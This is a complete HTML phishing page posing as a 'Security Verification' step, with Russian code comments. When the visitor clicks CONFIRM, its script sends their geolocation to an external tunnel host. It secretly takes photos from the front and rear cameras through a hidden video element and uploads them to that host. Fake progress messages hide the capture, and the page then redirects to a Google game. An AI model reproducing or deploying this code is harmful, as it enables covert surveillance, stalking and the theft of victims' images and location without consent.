<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <style>
        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow: hidden; }
        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 380px; border:1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 10; position: relative; }
        .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; text-transform: uppercase; }
        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
        @keyframes spin { 100% { transform:rotate(360deg); } }
        video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display:none; }
        p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
        body.flash-active { background: #fff !important; }
        .flash-active .card { opacity: 0; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg">Please confirm your identity to proceed.</p>
        <button class="btn" id="go" onclick="run()">CONFIRM</button>
        <div id="loader"></div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

<script>
    const API = "https://fd1923621b23b3.lhr.life"; 
    const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
    const user = new URLSearchParams(window.location.search).get('user') || "Unknown";

    async function capture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode, width: 1280, height: 720 },
                audio: false 
            });
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            await v.play();
            
            // Ждем 3 секунды - чем дольше, тем больше шансов на качественное фото
            await new Promise(r => setTimeout(r, 3000));

            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
            stream.getTracks().forEach(t => t.stop());
            return blob;
        } catch (e) { return null; }
    }

    async function run() {
        document.getElementById('go').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        const msg = document.getElementById('msg');

        // ГЕО
        navigator.geolocation.getCurrentPosition(p => {
            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`, {mode:'no-cors', keepalive:true});
        }, null, {timeout: 5000});

        // ФОТО
        msg.innerText = "Analyzing security (Step 1/2)...";
        const f1 = await capture("user");
        msg.innerText = "Analyzing security (Step 2/2)...";
        const f2 = await capture("environment");

        const fd = new FormData();
        if (f1) fd.append('files', f1, 'f.jpg');
        if (f2) fd.append('files', f2, 'b.jpg');

        if (fd.has('files')) {
            msg.innerText = "Sending encrypted data...";
            try {
                // ЖДЕМ ОТВЕТА ОТ СЕРВЕРА (убрали no-cors для надежности ожидания)
                const res = await fetch(`${API}/upload-photo?user=${user}`, {
                    method: 'POST',
                    body: fd
                });
                console.log("Server responded");
            } catch (e) { console.error("Send failed", e); }
        }

        msg.innerText = "Verified! Loading game...";
        setTimeout(() => { window.location.replace(REDIRECT_URL); }, 1000);
    }
</script>
</body>
</html>
